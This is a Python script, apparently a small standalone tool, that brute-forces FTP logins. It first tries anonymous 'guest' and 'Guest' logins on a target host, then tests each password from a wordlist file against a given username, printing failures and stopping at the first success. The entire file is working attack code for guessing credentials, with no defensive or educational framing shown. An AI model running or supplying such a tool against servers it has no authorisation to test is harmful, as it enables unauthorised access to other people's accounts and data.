#!/usr/bin/env python3

import ftplib
import sys

def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        ftp.quit()
        return True
    
    except:
        return False
    
def bruteForceLogin(ftpTarget, userLogin, pwdFile):
    f = open(pwdFile, 'r')
    login = {}

    for line in f.readlines():
        #Load each password
        pwd = line.strip('\r').strip('\n')
        
        if connect(ftpTarget, userLogin, pwd):
            print('[*]Login Success: ' +  ftpTarget + ' : ' + userLogin + ' : ' + pwd)
            login = {userLogin: pwd}        
            exit(0)
        else:
            print('Login failed: ' + userLogin + ' : ' + pwd)



def main():
    #Variable List
    targetHostAddress = sys.argv[1]
    userName = sys.argv[2]
    passwordFile = sys.argv[3]
    anonFlag = bool(int(sys.argv[4]))

    #Attempt Anonymous first if No-Anon flag not set
    if anonFlag == False:
        print('Attempting Anonymous Connection with: ' + targetHostAddress)
        if connect(targetHostAddress, 'guest', ''):
            print('Login: "guest" successful')
        elif connect(targetHostAddress, 'Guest', ''):
            print('Login: "Guest" successful')
        else:
            print('Anonymous guest logins failed on host: ' + targetHostAddress)
            bruteForceLogin(targetHostAddress, userName, passwordFile)

    else:
        bruteForceLogin(targetHostAddress, userName, passwordFile)

if __name__ == '__main__':
    main()
